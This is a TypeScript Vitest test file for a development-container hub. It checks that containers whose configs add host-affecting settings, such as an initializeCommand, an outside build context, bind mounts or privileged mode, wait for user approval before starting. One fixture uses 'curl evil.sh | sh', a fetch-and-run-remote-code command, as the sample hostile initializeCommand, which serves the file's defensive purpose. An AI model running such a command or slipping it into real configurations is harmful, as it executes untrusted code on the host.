import { describe, expect, it, vi } from "vitest";

import { ApprovalRequiredError } from "../../../src/server/environments/approvals";
import type { ConfigRead } from "../../../src/server/environments/containers";
import { ConflictError } from "../../../src/server/errors";
import {
  feat,
  featEnv,
  project,
  remoteEnv,
  remoteFix,
  running,
  setup,
  withRemote,
  withWorktree,
} from "../../helpers/hub";

const plain: ConfigRead = {
  configuration: { image: "node:22" },
  merged: { image: "node:22" },
  workspaceFolder: "/workspaces/feat",
};
const evil: ConfigRead = {
  configuration: { image: "node:22", initializeCommand: "curl evil.sh | sh" },
  merged: { image: "node:22", initializeCommand: "curl evil.sh | sh" },
  workspaceFolder: "/workspaces/demo",
};
const outsideContext: ConfigRead = {
  configFile: `${feat.hostPath}/.devcontainer/devcontainer.json`,
  configuration: { build: { context: "../..", dockerfile: "Dockerfile" } },
  merged: { build: { context: "../..", dockerfile: "Dockerfile" } },
  workspaceFolder: "/workspaces/feat",
};

/** Reads `config` for the checkout at `folder` and the plain config elsewhere. */
const configAt =
  (folder: string, config: ConfigRead) =>
  async (f: string): Promise<ConfigRead> =>
    f === folder ? config : plain;

describe("approval gate: main container", () => {
  it("doesn't start a container whose config gained an initializeCommand, and approving starts it", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    s.containers.readConfig.mockImplementation(configAt(project.path, evil));
    await expect(s.hub.environments.start(project.id)).rejects.toBeInstanceOf(
      ApprovalRequiredError
    );
    expect(s.containers.up).not.toHaveBeenCalled();
    const [pending] = s.approvals.pending(project.id);
    expect(pending.sources).toStrictEqual([{ kind: "main" }]);
    expect(pending.changes).toStrictEqual([
      { after: "curl evil.sh | sh", key: "initializeCommand", kind: "added" },
    ]);
    expect(s.store.runtime(project.id).error).toContain("initializeCommand");

    s.approvals.approve(project.id, pending.fingerprint);
    await vi.waitFor(() =>
      expect(s.store.runtime(project.id).opencode).toBe("healthy")
    );
    expect(s.containers.up).toHaveBeenCalledOnce();
    // The approval stays: the next start doesn't ask.
    await s.hub.environments.rebuild(project.id);
    expect(s.approvals.pending(project.id)).toStrictEqual([]);
  });

  it("fails a dashboard start at once with a 409-style error naming the approval, and approving runs that action", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    s.containers.readConfig.mockImplementation(configAt(project.path, evil));
    const retry = vi.fn();
    const error = await s.hub.environments
      .checkConfig(project.id, undefined, retry)
      .catch((e: unknown) => e);
    expect(error).toBeInstanceOf(ConflictError);
    expect((error as ApprovalRequiredError).fingerprint).toBe(
      s.approvals.pending(project.id)[0].fingerprint
    );
    s.approvals.approve(
      project.id,
      (error as ApprovalRequiredError).fingerprint
    );
    expect(retry).toHaveBeenCalledOnce();
  });

  it("starts a config without host-affecting settings without asking", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    await s.hub.environments.start(project.id);
    expect(s.containers.up).toHaveBeenCalledOnce();
    expect(s.approvals.pending(project.id)).toStrictEqual([]);
  });
});

describe("approval gate: task containers", () => {
  it("builds no image and starts nothing while a worktree's build context needs approval", async () => {
    const s = await withWorktree();
    s.containers.readConfig.mockImplementation(
      configAt(feat.hostPath, outsideContext)
    );
    const { envId } = await s.hub.environments.createEnv(project.id, feat.path);
    await vi.waitFor(() =>
      expect(s.approvals.pending(project.id)).toHaveLength(1)
    );
    await vi.waitFor(() =>
      expect(s.store.runtime(envId).containerState).toBe("error")
    );
    expect(s.images.ensureBase).not.toHaveBeenCalled();
    expect(s.containers.up.mock.calls.filter(([t]) => t.idLabels)).toHaveLength(
      0
    );
    const [pending] = s.approvals.pending(project.id);
    expect(pending.sources).toStrictEqual([
      { branch: "feat", envId: featEnv, kind: "worktree", node: "local" },
    ]);
    expect(pending.surface).toStrictEqual({
      buildContext: { outside: true, path: ".." },
    });

    // The Worktrees tab's Start fails at once too; approving runs that start.
    await expect(
      s.hub.environments.checkConfig(
        project.id,
        envId,
        () => void s.hub.environments.startEnv(project.id, envId)
      )
    ).rejects.toBeInstanceOf(ApprovalRequiredError);

    s.approvals.approve(project.id, pending.fingerprint);
    await vi.waitFor(() =>
      expect(s.store.runtime(envId).opencode).toBe("healthy")
    );
    expect(s.images.ensureBase).toHaveBeenCalledOnce();
  });

  it("starts a worktree whose settings equal the main checkout's approved ones", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    s.worktrees.list.mockResolvedValue([feat]);
    const mounts = (root: string): ConfigRead => ({
      configuration: {
        mounts: [`source=${root}/../cache,target=/c,type=bind`],
      },
      merged: { mounts: [`source=${root}/../cache,target=/c,type=bind`] },
    });
    s.containers.readConfig.mockImplementation(async (f: string) => mounts(f));
    await expect(s.hub.environments.start(project.id)).rejects.toThrow();
    s.approvals.approve(
      project.id,
      s.approvals.pending(project.id)[0].fingerprint
    );
    await vi.waitFor(() =>
      expect(s.store.runtime(project.id).opencode).toBe("healthy")
    );
    const { envId } = await s.hub.environments.createEnv(project.id, feat.path);
    await vi.waitFor(() =>
      expect(s.store.runtime(envId).opencode).toBe("healthy")
    );
    expect(s.approvals.pending(project.id)).toStrictEqual([]);
  });

  it("gates a remote node's environment through its kit", async () => {
    const s = await withRemote();
    s.box.kit.containers.readConfig.mockImplementation(async () => ({
      ...evil,
      workspaceFolder: remoteFix.path as string | undefined,
    }));
    await expect(
      s.hub.environments.startEnv(project.id, remoteEnv)
    ).rejects.toBeInstanceOf(ApprovalRequiredError);
    expect(s.box.kit.containers.readConfig).toHaveBeenCalledWith(
      remoteFix.hostPath
    );
    expect(s.box.kit.images.ensureBase).not.toHaveBeenCalled();
    expect(s.box.kit.containers.up).not.toHaveBeenCalled();
    expect(s.approvals.pending(project.id)[0].sources).toStrictEqual([
      { branch: "fix", envId: remoteEnv, kind: "worktree", node: "box" },
    ]);
  });
});

describe("approval gate: adoption", () => {
  it("adopts a running container whose config needs approval without asking", async () => {
    const s = setup({
      projects: {
        [project.id]: { password: "pw", workspaceFolder: "/workspaces/demo" },
      },
    });
    s.containers.readConfig.mockImplementation(configAt(project.path, evil));
    s.containers.listManaged.mockResolvedValueOnce([running]);
    await s.hub.environments.rescan();
    await s.hub.environments.adopt();
    expect(s.store.runtime(project.id)).toMatchObject({
      containerState: "running",
      opencode: "healthy",
    });
    expect(s.approvals.pending(project.id)).toStrictEqual([]);
    // …and asks on its next start.
    await expect(s.hub.environments.rebuild(project.id)).rejects.toBeInstanceOf(
      ApprovalRequiredError
    );
  });
});

describe("approving from the dashboard", () => {
  it("lists pending approvals in the snapshot and clears them once approved", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    s.containers.readConfig.mockImplementation(configAt(project.path, evil));
    await expect(s.hub.environments.start(project.id)).rejects.toThrow();
    const [view] = s.store.snapshot().projects;
    expect(view.approvals).toMatchObject([
      {
        first: true,
        sources: [{ kind: "main" }],
        surface: { initializeCommand: "curl evil.sh | sh" },
      },
    ]);
    await s.hub.environments.approveConfig(
      project.id,
      view.approvals![0].fingerprint
    );
    expect(s.store.snapshot().projects[0].approvals).toBeUndefined();
    await vi.waitFor(() => expect(s.containers.up).toHaveBeenCalledOnce());
  });

  it("refuses an approval as changed when the config changed since the review", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    s.containers.readConfig.mockImplementation(configAt(project.path, evil));
    await expect(s.hub.environments.start(project.id)).rejects.toThrow();
    const [reviewed] = s.approvals.pending(project.id);
    const worse: ConfigRead = {
      configuration: { ...evil.configuration, privileged: true },
      merged: { ...evil.merged, privileged: true },
    };
    s.containers.readConfig.mockImplementation(configAt(project.path, worse));
    await expect(
      s.hub.environments.approveConfig(project.id, reviewed.fingerprint)
    ).rejects.toBeInstanceOf(ConflictError);
    expect(s.approvals.approved(project.id)).toStrictEqual([]);
    expect(s.containers.up).not.toHaveBeenCalled();
    // The banner shows the new settings.
    expect(
      s.approvals.pending(project.id).map((p) => p.surface.privileged)
    ).toStrictEqual([true]);
  });

  it("keeps a container stopped without recording an approval", async () => {
    const s = setup();
    await s.hub.environments.rescan();
    s.containers.readConfig.mockImplementation(configAt(project.path, evil));
    await expect(s.hub.environments.start(project.id)).rejects.toThrow();
    s.hub.environments.refuseConfig(
      project.id,
      s.approvals.pending(project.id)[0].fingerprint
    );
    expect(s.approvals.pending(project.id)).toStrictEqual([]);
    expect(s.approvals.approved(project.id)).toStrictEqual([]);
    expect(s.containers.up).not.toHaveBeenCalled();
  });
});
